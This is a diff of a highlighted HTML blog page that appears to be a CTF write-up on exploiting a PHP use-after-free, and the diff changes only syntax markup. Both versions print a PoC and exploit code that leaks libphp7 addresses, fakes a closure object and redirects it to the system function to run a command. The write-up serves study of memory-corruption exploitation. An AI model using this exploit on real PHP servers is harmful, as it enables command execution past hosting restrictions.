@@ -285,31 +285,31 @@ presumably for the same reason.</p>
 </blockquote>
 <p>The PoC with explanation is shown below:</p>
 <pre class="hljs"><code><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>{
-    <span class="hljs-keyword">public</span> $a;
-    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{
-        <span class="hljs-keyword">global</span> $backtrace;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{
+        <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>;
         <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;a);
-        $backtrace = (<span class="hljs-keyword">new</span> <span class="hljs-keyword">Exception</span>)-&gt;getTrace(); <span class="hljs-comment">// backtrace has ref to $arg</span>
+        <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;getTrace(); <span class="hljs-comment">// backtrace has ref to $arg</span>
     }
 }
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span><span class="hljs-params">($arg)</span> </span>{
-    $arg = str_shuffle(str_repeat(<span class="hljs-string">'A'</span>, <span class="hljs-number">79</span>)); <span class="hljs-comment">// string to be UAFed</span>
-    $vuln = <span class="hljs-keyword">new</span> Vuln();
-    $vuln-&gt;a = $arg;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>{
+    <span class="hljs-variable">$arg</span> = str_shuffle(str_repeat(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">79</span>)); <span class="hljs-comment">// string to be UAFed</span>
+    <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> Vuln();
+    <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;
 }
-trigger_uaf(<span class="hljs-string">'x'</span>);
-$backtrace[<span class="hljs-number">0</span>][<span class="hljs-string">'args'</span>][<span class="hljs-number">1</span>] <span class="hljs-comment">// access UAF string</span></code></pre><h2 id="0x03-exploit"><a class="header-link" href="#0x03-exploit"></a>0x03 Exploit</h2>
+trigger_uaf(<span class="hljs-string">&#x27;x&#x27;</span>);
+<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">1</span>] <span class="hljs-comment">// access UAF string</span></code></pre><h2 id="0x03-exploit"><a class="header-link" href="#0x03-exploit"></a>0x03 Exploit</h2>
 <h3 id="php-object-memory-layout"><a class="header-link" href="#php-object-memory-layout"></a>PHP Object Memory Layout</h3>
 <p>Before exploiting any script engine, one critical thing to know is how object is stored in this script engine. In this case, we need to know how <code>string</code> and other PHP objects are stored in memory, since the best way to exploit UAF is to replace the just freed string with another PHP object to have type confusion. In this way we may do some evil stuff such as leaking critical memory addresses by reading from that PHP string.</p>
 <p>Thanks to @Anciety who helped me to find <a href="https://github.com/php/php-src/blob/master/Zend/zend_types.h">definition of various PHP types</a>, I can investigate the exploitation more conveniently.</p>
 <p>The exploit method that the provided exploit is using is to obfuscate PHP string with PHP object created from class. Here are definitions of these 2 types:</p>
-<pre class="hljs"><code><span class="hljs-keyword">struct</span> _zend_string {
+<pre class="hljs"><code><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">zend_string</span> {</span>
     zend_refcounted_h gc;
     zend_ulong        h;                <span class="hljs-comment">/* hash value */</span>
     <span class="hljs-keyword">size_t</span>            len;
     <span class="hljs-keyword">char</span>              val[<span class="hljs-number">1</span>];
 };
-<span class="hljs-keyword">struct</span> _zend_object {
+<span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">zend_object</span> {</span>
     zend_refcounted_h gc;
     <span class="hljs-keyword">uint32_t</span>          handle; <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> may be removed ???</span>
     zend_class_entry *ce;
@@ -329,24 +329,24 @@ len         ce
 <span class="hljs-keyword">val</span>+<span class="hljs-number">24</span>      <span class="hljs-keyword">type</span> <span class="hljs-keyword">of</span> first field
        ...</code></pre><h3 id="leak"><a class="header-link" href="#leak"></a>Leak</h3>
 <p>Therefore, we can leak pointer of object by reading content in <code>+0x10</code> offset. In addition, pointer <code>handlers</code> points to somewhere at <code>libphp7.so</code> so that we can also leak base address of <code>libphp7</code>.</p>
-<pre class="hljs"><code>$helper = <span class="hljs-keyword">new</span> Helper;
-$helper-&gt;a = $helper;
-$helper-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">($x)</span> </span>{};
-$helper-&gt;c = <span class="hljs-number">0x1337</span>;
+<pre class="hljs"><code><span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> Helper;
+<span class="hljs-variable">$helper</span>-&gt;a = <span class="hljs-variable">$helper</span>;
+<span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>{};
+<span class="hljs-variable">$helper</span>-&gt;c = <span class="hljs-number">0x1337</span>;
 
-$closure_handlers = str2ptr($abc, <span class="hljs-number">0</span>);
-$php_heap = str2ptr($abc, <span class="hljs-number">0x10</span>);
+<span class="hljs-variable">$closure_handlers</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$php_heap</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>);
 <span class="hljs-comment">// leaker address of $helper, which is also that of $abc</span>
-$helper-&gt;a = <span class="hljs-string">"helper"</span>; 
+<span class="hljs-variable">$helper</span>-&gt;a = <span class="hljs-string">&quot;helper&quot;</span>; 
 <span class="hljs-comment">// if we still have circular reference, </span>
 <span class="hljs-comment">// a strage crash will occur when rewriting string,</span>
 <span class="hljs-comment">// so we remove circular reference here</span>
-$abc_addr = $php_heap + <span class="hljs-number">0x18</span>;
-$libphp_addr = str2ptr($abc, <span class="hljs-number">0</span>) - <span class="hljs-number">0xd73ec0</span>;
-$zif_system = $libphp_addr + <span class="hljs-number">0x355a86</span>;
+<span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> + <span class="hljs-number">0x18</span>;
+<span class="hljs-variable">$libphp_addr</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>) - <span class="hljs-number">0xd73ec0</span>;
+<span class="hljs-variable">$zif_system</span> = <span class="hljs-variable">$libphp_addr</span> + <span class="hljs-number">0x355a86</span>;
 <span class="hljs-comment">// leak libphp and thus zif_system function</span>
-$helper-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">($x)</span></span>{};
-$closure_obj = str2ptr($abc, <span class="hljs-number">0x20</span>);
+<span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span>{};
+<span class="hljs-variable">$closure_obj</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);
 <span class="hljs-comment">// leak a pointer pointing to a user-defined function object</span></code></pre><p>By the way, the way to leak <code>abc_addr</code> resented in provided exploit does not work here, I don&#39;t know why. In addition, the ELF stuff inside provided exploit is not necessary, because we already know the <code>libphp7</code> so that <code>zif_system</code> address can be calculated directly.</p>
 <h3 id="code-execution"><a class="header-link" href="#code-execution"></a>Code Execution</h3>
 <p>This is actually the part the got me stuck for very long time. The primary objective is to rewrite the function in <code>b</code> field to PHP system function. As the provided exploit suggests, we need to write <code>$closure_obj+0x38</code> to 1 and <code>$closure_obj+0x68</code> to <code>zif_system</code>.  I have came up with 4 approaches, but only the last one works:</p>
@@ -357,50 +357,50 @@ $closure_obj = str2ptr($abc, <span class="hljs-number">0x20</span>);
 <li>Copy the contents inside <code>$closure_obj</code> and change the relevant field in the copied fake object. This is the approach used by provided exploit. However, we cannot use <code>strlen</code> function to achieve arbitrary memory read, unlike the provided exploit. My approach is to interpret address <code>$closure_obj</code> as a PHP string so that we can read contents after <code>+0x18</code> offset. As for copying, since the recursion depth and loop are restricted, we just copy and paste the code to achieve the copy. The relevant codes are shown below:</li>
 </ol>
 <pre class="hljs"><code><span class="hljs-comment">// fake value</span>
-write($abc, <span class="hljs-number">0x10</span>, $closure_obj);
-write($abc, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x6</span>); 
+write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$closure_obj</span>);
+write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x6</span>); 
 <span class="hljs-comment">// fake a string object at $closure_obj</span>
 
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">copyFunc</span><span class="hljs-params">($off)</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">copyFunc</span>(<span class="hljs-params"><span class="hljs-variable">$off</span></span>)
 </span>{
-    <span class="hljs-keyword">global</span> $helper;
-    <span class="hljs-keyword">global</span> $abc;
-    <span class="hljs-keyword">if</span> ($off &gt; <span class="hljs-number">0x110</span>) <span class="hljs-keyword">return</span>;
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x18</span> + $off, str2ptr($helper-&gt;a, $off));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x20</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">8</span>));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x28</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">0x10</span>));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x30</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">0x18</span>));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">0x20</span>));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x40</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">0x28</span>));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x48</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">0x30</span>));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x50</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">0x38</span>));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x58</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">0x40</span>));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x60</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">0x48</span>));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">0x50</span>));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x70</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">0x58</span>));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x78</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">0x60</span>));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x80</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">0x68</span>));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x88</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">0x70</span>));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x90</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">0x78</span>));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x98</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">0x80</span>));
-    write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0xa0</span> + $off, str2ptr($helper-&gt;a, $off+<span class="hljs-number">0x88</span>));
-    copyFunc($off + <span class="hljs-number">0x90</span>);
+    <span class="hljs-keyword">global</span> <span class="hljs-variable">$helper</span>;
+    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>;
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$off</span> &gt; <span class="hljs-number">0x110</span>) <span class="hljs-keyword">return</span>;
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x18</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x20</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">8</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x28</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x10</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x30</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x18</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x20</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x40</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x28</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x48</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x30</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x50</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x38</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x58</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x40</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x60</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x48</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x50</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x70</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x58</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x78</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x60</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x80</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x68</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x88</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x70</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x90</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x78</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x98</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x80</span>));
+    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0xa0</span> + <span class="hljs-variable">$off</span>, str2ptr(<span class="hljs-variable">$helper</span>-&gt;a, <span class="hljs-variable">$off</span>+<span class="hljs-number">0x88</span>));
+    copyFunc(<span class="hljs-variable">$off</span> + <span class="hljs-number">0x90</span>);
 } <span class="hljs-comment">// function to copy the content inside $closure_obj</span>
 
-write($abc, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x0000031800000002</span>);
-write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">8</span>, <span class="hljs-number">0x0000000000000003</span>);
+write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x0000031800000002</span>);
+write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">8</span>, <span class="hljs-number">0x0000000000000003</span>);
 <span class="hljs-comment">// write some headers in $closure_obj, </span>
 <span class="hljs-comment">// which are simply constants from gdb</span>
 copyFunc(<span class="hljs-number">0</span>); <span class="hljs-comment">// copy body in $closure_obj</span>
 
-write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">0x0210000000000001</span>);
-write($abc, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, $zif_system);
+write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">0x0210000000000001</span>);
+write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>);
 <span class="hljs-comment">// rewrite critical fields to make the function `system`</span>
-write($abc, <span class="hljs-number">0x20</span>, $abc_addr + <span class="hljs-number">0xd0</span>);
+write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0xd0</span>);
 <span class="hljs-comment">// rewrite pointer of field b to newly faked function object</span>
 
-($helper-&gt;b)($cmd);
-<span class="hljs-keyword">die</span>(<span class="hljs-string">"end"</span>);</code></pre><p>The full exploit is <a href="https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/easyphpuaf.php">here</a>.</p>
+(<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);
+<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;end&quot;</span>);</code></pre><p>The full exploit is <a href="https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/easyphpuaf.php">here</a>.</p>
         </article>
       </div>
     </div>
